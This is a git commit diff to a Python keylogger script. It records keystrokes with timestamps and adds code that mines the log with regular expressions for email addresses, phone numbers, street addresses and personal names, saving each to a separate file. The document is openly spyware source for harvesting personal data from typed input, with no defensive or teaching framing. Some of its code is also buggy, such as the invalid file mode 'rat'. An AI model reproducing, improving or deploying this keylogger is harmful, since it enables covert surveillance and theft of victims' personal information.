fadee4e9fe46c53dce62bc0dffa48ab7f9eff994
Benson Montano <efffectery@gmail.com>
2025-03-01 12:21:05 -0700

    Updated

--- main.py
+++ main.py
@@ -15,15 +15,51 @@ logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(messag
 def on_press(key):
     try:
         # Log the key pressed (character keys like a, b, 1, etc.)
-        logging.info((f"{key.char}"), (f"{time}"))
+        logging.info(f"{key.char} {time}")
     except AttributeError:
         # Handle special keys like space, enter, etc.
-        logging.info((f"{key}"), (f"{time}"))
+        logging.info(f"{key} {time}")
 
-# Define a function to process keylog data and use NLP to extract critical info
 def process_log():
     with open("keylog.txt", "rat") as file:
         log_data = file.read()
+
+def get_clean_data():
+    with open("keylog.txt", "r") as file:
+        log_data = file.read()
+
+    cleaned_data = ''.join([line.split(' ')[0] for line in log_data.splitlines()])
+    return cleaned_data
+
+def extracted_info(cleaned_data):
+    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+    phone_pattern = r'\+?\d{1,4}?[-.\s]?\(?\d{1,3}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}[-.\s]?\d{1,9}'
+    address_pattern = r'\d{1,5}\s[\w\s]+(?:Street|St|Avenue|Ave|Road|Rd|Drive|Dr|Lane|Ln|Boulevard|Blvd)\s*,?\s*[\w\s]+(?:City|Town|Village|District|County|State|Province|Country)?'
+    name_pattern = r'[A-Z][a-z]+\s[A-Z][a-z]+'
+
+    emails = re.findall(email_pattern, cleaned_data)
+    phone_numbers = re.findall(phone_pattern, cleaned_data)
+    addresses = re.findall(address_pattern, cleaned_data)
+    names = re.findall(name_pattern, cleaned_data)
+
+    return emails, phone_numbers, addresses, names
+
+def make_files(emails, phone_numbers, addresses, names):
+    with open("emails.txt", "at") as email_file:
+        for email in emails:
+            email_file.write(email)
+
+    with open("phone_numbers.txt", "at") as phones_file:
+        for phone_number in phone_numbers:
+            phones_file.write(phone_number)
+
+    with open("addresses.txt", "at") as addresses_file:
+        for address in addresses:
+            addresses_file.write(address)
+
+    with open("names.txt", "at") as names_file:
+        for name in names:
+            names_file.write(name)
 
 # Define a function to start the keylogger
 def start_keylogger():
@@ -36,8 +72,12 @@ try:
     if __name__ == "__main__":
         print("Keylogger started. Press 'Ctrl+C' to stop.")
         start_keylogger()
+
 finally:
     # Change to your project directory
+    emails, phone_numbers, addresses, names  = extracted_info(get_clean_data())
+    make_files(emails, phone_numbers, addresses, names)
+
     project_dir = os.getcwd()
     os.chdir(project_dir)
 
